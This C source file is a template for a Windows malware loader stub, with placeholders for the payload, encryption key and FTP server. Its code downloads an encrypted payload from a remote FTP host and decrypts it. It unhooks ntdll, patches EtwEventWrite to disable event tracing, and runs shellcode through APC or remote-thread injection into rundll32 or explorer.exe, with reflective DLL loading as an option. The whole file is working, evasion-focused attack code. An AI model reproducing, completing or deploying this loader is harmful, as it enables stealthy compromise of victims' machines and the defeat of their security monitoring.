#include <windows.h>
#include <tlhelp32.h>
#include <bcrypt.h>
#include <string.h>
#ifdef NEED_REFLECTIVE
#include "ReflectiveLoader.h"
#endif
#include <stdio.h>

#ifdef DEBUG
  // variadic macro that works even if you pass only fmt
  #define DBG(fmt, ...) do {                                    \
      char _dbgbuf[256];                                         \
      snprintf(_dbgbuf, sizeof(_dbgbuf), fmt, ##__VA_ARGS__);   \
      OutputDebugStringA(_dbgbuf);                               \
  } while(0)
#else
  #define DBG(fmt, ...) do { } while(0)
#endif

#pragma comment(lib, "bcrypt.lib")

typedef void* HINTERNET;
typedef unsigned short INTERNET_PORT;

#define INTERNET_DEFAULT_FTP_PORT 21
#define INTERNET_SERVICE_FTP 1
#define INTERNET_FLAG_PASSIVE 0x08000000
#define FTP_TRANSFER_TYPE_BINARY 0x00000002
#ifndef GENERIC_READ
#define GENERIC_READ 0x80000000
#endif

#ifndef DLLMAIN
typedef BOOL (WINAPI *DLLMAIN)(HINSTANCE, DWORD, LPVOID);
#endif

typedef HMODULE(WINAPI* tLoadLibA)(LPCSTR);
typedef FARPROC(WINAPI* tGetProcA)(HMODULE, LPCSTR);
tLoadLibA pLoadLibA;
tGetProcA pGetProcA;

#ifndef STAGED_BUILD
unsigned char payload[] = { {{PAYLOAD_ARRAY}} };
size_t payload_len = {{PAYLOAD_SIZE}};
#endif
unsigned char *payload_ptr = NULL;
char key[] = {{KEY}};
char enc_algo[] = {{ENC_ALGO}};
char payload_type[] = {{PAYLOAD_TYPE}};
char FTP_USER[] = "{{FTP_USER}}";
char FTP_PASS[] = "{{FTP_PASS}}";
wchar_t IP[64] = L"{{IP}}";
wchar_t PATH[128] = L"{{PATH}}";
short PORT = {{PORT}};

void decrypt_payload(unsigned char *buf, size_t len) {
    if (strcmp(enc_algo, "aes") != 0) return;
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    DWORD cbKeyObject = 0, cbData = 0, cbResult = 0;
    PUCHAR pbKeyObject = NULL;
    unsigned char key_material[16] = {0};
    size_t key_len = strlen(key);
    for (int i = 0; i < 16; i++) key_material[i] = (i < key_len) ? key[i] : 0;
    unsigned char iv[16] = {0};
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) return;
    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) goto cleanup;
    status = BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&cbKeyObject, sizeof(DWORD), &cbResult, 0);
    if (!BCRYPT_SUCCESS(status)) goto cleanup;
    pbKeyObject = HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
    if (!pbKeyObject) goto cleanup;
    status = BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, key_material, 16, 0);
    if (!BCRYPT_SUCCESS(status)) goto cleanup;
    BCryptDecrypt(hKey, buf, len, NULL, iv, sizeof(iv), buf, len, &cbData, 0);
cleanup:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    if (pbKeyObject) HeapFree(GetProcessHeap(), 0, pbKeyObject);
}

int download_payload() {
    char str_wininet[] = { 'w','i','n','i','n','e','t','.','d','l','l','\0' };
    char str_open[] = { 'I','n','t','e','r','n','e','t','O','p','e','n','A','\0' };
    char str_connect[] = { 'I','n','t','e','r','n','e','t','C','o','n','n','e','c','t','A','\0' };
    char str_ftpopen[] = { 'F','t','p','O','p','e','n','F','i','l','e','A','\0' };
    char str_read[] = { 'I','n','t','e','r','n','e','t','R','e','a','d','F','i','l','e','\0' };
    char str_close[] = { 'I','n','t','e','r','n','e','t','C','l','o','s','e','H','a','n','d','l','e','\0' };
    char str_agent[] = { 'F','T','P','R','e','a','d','e','r','\0' };

    HMODULE hWinInet = pLoadLibA(str_wininet);
    if (!hWinInet) return 0;

    typedef HINTERNET(WINAPI *fnInternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
    typedef HINTERNET(WINAPI *fnInternetConnectA)(HINTERNET, LPCSTR, INTERNET_PORT, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
    typedef HINTERNET(WINAPI *fnFtpOpenFileA)(HINTERNET, LPCSTR, DWORD, DWORD, DWORD_PTR);
    typedef BOOL(WINAPI *fnInternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);
    typedef BOOL(WINAPI *fnInternetCloseHandle)(HINTERNET);

    fnInternetOpenA InternetOpenA_ = (fnInternetOpenA)pGetProcA(hWinInet, str_open);
    fnInternetConnectA InternetConnectA_ = (fnInternetConnectA)pGetProcA(hWinInet, str_connect);
    fnFtpOpenFileA FtpOpenFileA_ = (fnFtpOpenFileA)pGetProcA(hWinInet, str_ftpopen);
    fnInternetReadFile InternetReadFile_ = (fnInternetReadFile)pGetProcA(hWinInet, str_read);
    fnInternetCloseHandle InternetCloseHandle_ = (fnInternetCloseHandle)pGetProcA(hWinInet, str_close);

    if (!InternetOpenA_ || !InternetConnectA_ || !FtpOpenFileA_ || !InternetReadFile_ || !InternetCloseHandle_) return 0;

    char ipA[128], pathA[128];
    wcstombs(ipA, IP, sizeof(ipA));
    wcstombs(pathA, PATH, sizeof(pathA));

    HINTERNET hInet = InternetOpenA_(str_agent, 1, NULL, NULL, 0);
    if (!hInet) return 0;

    HINTERNET hFtp = InternetConnectA_(hInet, ipA, INTERNET_DEFAULT_FTP_PORT, FTP_USER, FTP_PASS, INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
    if (!hFtp) { InternetCloseHandle_(hInet); return 0; }

    HINTERNET hFile = FtpOpenFileA_(hFtp, pathA, GENERIC_READ, FTP_TRANSFER_TYPE_BINARY, 0);
    if (!hFile) { InternetCloseHandle_(hFtp); InternetCloseHandle_(hInet); return 0; }

    unsigned char tmp[4096]; DWORD r = 0;
    payload_ptr = (unsigned char*)malloc(1);
    payload_len = 0; size_t capacity = 0;

    while (InternetReadFile_(hFile, tmp, sizeof(tmp), &r) && r > 0) {
        if (payload_len + r > capacity) {
            capacity = (capacity == 0) ? 8192 : capacity * 2;
            payload_ptr = (unsigned char*)realloc(payload_ptr, capacity);
        }
        memcpy(payload_ptr + payload_len, tmp, r);
        payload_len += r;
    }

    InternetCloseHandle_(hFile);
    InternetCloseHandle_(hFtp);
    InternetCloseHandle_(hInet);
    return 1;
}

typedef BOOL(WINAPI* VirtualProtect_t)(LPVOID, SIZE_T, DWORD, PDWORD);
VirtualProtect_t VirtualProtect_p = NULL;

int UnhookNtdll(HMODULE hNtdll, LPVOID pMapping) {
    DWORD oldProtect = 0;
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)pMapping;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((BYTE*)pMapping + dosHeader->e_lfanew);

    for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeader) + i;
        if (memcmp(section->Name, ".text", 5) == 0) {
            void* ntdllTextAddr = (BYTE*)hNtdll + section->VirtualAddress;
            VirtualProtect_p(ntdllTextAddr, section->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtect);
            memcpy(ntdllTextAddr, (BYTE*)pMapping + section->VirtualAddress, section->Misc.VirtualSize);
            VirtualProtect_p(ntdllTextAddr, section->Misc.VirtualSize, oldProtect, &oldProtect);
            return 0;
        }
    }
    return -1;
}

void DisableETW() {
    DWORD oldProtect;
    void* pEtwEventWrite = GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
    if (!pEtwEventWrite) return;

    VirtualProtect_p(pEtwEventWrite, 8, PAGE_EXECUTE_READWRITE, &oldProtect);
#ifdef _WIN64
    unsigned char patch[] = { 0x48, 0x33, 0xC0, 0xC3 }; // xor rax, rax; ret
#else
    unsigned char patch[] = { 0x33, 0xC0, 0xC2, 0x14, 0x00 }; // xor eax, eax; ret 0x14
#endif
    memcpy(pEtwEventWrite, patch, sizeof(patch));
    VirtualProtect_p(pEtwEventWrite, 8, oldProtect, &oldProtect);
    FlushInstructionCache(GetCurrentProcess(), pEtwEventWrite, 8);
}


void XORDecrypt(unsigned char* data, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

void PatchETWUnhookNtdll() {

    unsigned char obf_ntdll_path[] = {
    0x79, 0x00, 0x66, 0x6D, 0x53, 0x54, 0x5E, 0x55, 0x4D, 0x49,
    0x66, 0x69, 0x43, 0x49, 0x4E, 0x5F, 0x57, 0x09, 0x08, 0x66,
    0x54, 0x4E, 0x5E, 0x56, 0x56, 0x14, 0x5E, 0x56, 0x56, 0x3A
    };

    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    VirtualProtect_p = (VirtualProtect_t)GetProcAddress(hKernel32, "VirtualProtect");

    unsigned char key = obf_ntdll_path[sizeof(obf_ntdll_path) - 1];
    XORDecrypt(obf_ntdll_path, sizeof(obf_ntdll_path), key);
    HANDLE hFile = CreateFileA((char*)obf_ntdll_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;

    HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hMapping) {
        CloseHandle(hFile);
        return;
    }

    LPVOID pMapping = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!pMapping) {
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return;
    }

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    UnhookNtdll(hNtdll, pMapping);

    UnmapViewOfFile(pMapping);
    CloseHandle(hMapping);
    CloseHandle(hFile);

    DisableETW();
}

#ifdef NEED_REFLECTIVE
void execute_reflective_dll(unsigned char *dll_buf, size_t dll_len) {
    LPVOID dll_mem = VirtualAlloc(NULL, dll_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!dll_mem) return;
    memcpy(dll_mem, dll_buf, dll_len);
    DWORD offset = GetReflectiveLoaderOffset(dll_mem);
    if (!offset) return;
    DLLMAIN entry = (DLLMAIN)((ULONG_PTR)dll_mem + offset);
    entry((HINSTANCE)dll_mem, DLL_PROCESS_ATTACH, NULL);
}
#endif

void inject_APC(unsigned char *sc, size_t l) {
    char str_target[] = "C:\\Windows\\System32\\rundll32.exe";

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (!CreateProcessA(str_target, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
        return;

    LPVOID remote = VirtualAllocEx(pi.hProcess, NULL, l, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remote) { TerminateProcess(pi.hProcess, 1); return; }

    if (!WriteProcessMemory(pi.hProcess, remote, sc, l, NULL)) { TerminateProcess(pi.hProcess, 1); return; }

    QueueUserAPC((PAPCFUNC)remote, pi.hThread, (ULONG_PTR)0);

#if EARLY_BIRD_MODE
    // Early Bird APC injection: APC queued *before* ResumeThread(), thread hasn't reached user mode yet.
    ResumeThread(pi.hThread);
#else
    // Classic APC injection: Give EDRs a race window
    ResumeThread(pi.hThread);
    Sleep(50);  // Optional: small delay to improve reliability if needed.
#endif

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}

void inject_WinFiber(LPCSTR targetProcName, PVOID payload, DWORD payload_len) {
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    DWORD targetPID = 0;

    if (Process32First(hSnap, &pe32)) {
        do {
            if (_stricmp(pe32.szExeFile, targetProcName) == 0) {
                targetPID = pe32.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnap, &pe32));
    }
    CloseHandle(hSnap);

    if (!targetPID) {
        DBG("[!] Could not find process %s\n", targetProcName);
        return;
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
    if (!hProcess) {
        DBG("[!] OpenProcess failed: %lu\n", GetLastError());
        return;
    }

    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMem) {
        DBG("[!] VirtualAllocEx failed: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return;
    }

    if (!WriteProcessMemory(hProcess, remoteMem, payload, payload_len, NULL)) {
        DBG("[!] WriteProcessMemory failed: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);
    if (!hThread) {
        DBG("[!] CreateRemoteThread failed: %lu\n", GetLastError());
    } else {
        CloseHandle(hThread);
    }

    CloseHandle(hProcess);
}

int main() {
    DBG("[*] stub: entry\n");
    unsigned char *buf = payload;
    size_t len = payload_len;

    if (wcslen(IP) > 0 && PATH[0] != 0) {
        DBG("[*] stub: downloading payload from %ls:%d / %ls\n", IP, PORT, PATH);
        pLoadLibA = (tLoadLibA)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
        pGetProcA = (tGetProcA)GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetProcAddress");
        if (!download_payload()) {
            DBG("[!] stub: download_payload failed\n");
            return -1;
        }
        DBG("[*] stub: downloaded %zu bytes\n", payload_len);
        buf = payload_ptr;
        len = payload_len;
    }

    PatchETWUnhookNtdll();

    DBG("[*] stub: decrypting payload (len=%zu)\n", len);
    decrypt_payload(buf, len);
    DBG("[*] stub: decrypt complete\n");

    if (strcmp(payload_type, "dll") == 0) {
        #ifdef NEED_REFLECTIVE
        DBG("[*] stub: executing reflective DLL\n");
        execute_reflective_dll(buf, len);
        DBG("[*] stub: execute_reflective_dll returned\n");
        #else
        DBG("[!] stub: dll payload but NEED_REFLECTIVE undefined! Skipping.\n");
        #endif
    }
    else if (strcmp(payload_type, "shellcode") == 0) {
    if (strcmp(enc_algo, "winfiber") == 0) {
        DBG("[*] stub: injecting shellcode via WinFiber\n");
        inject_WinFiber("explorer.exe", buf, len);  // default target
    } else {
        DBG("[*] stub: injecting shellcode via APC\n");
        inject_APC(buf, len);
    }
}

    DBG("[*] stub: exit normally\n");
    return 0;

}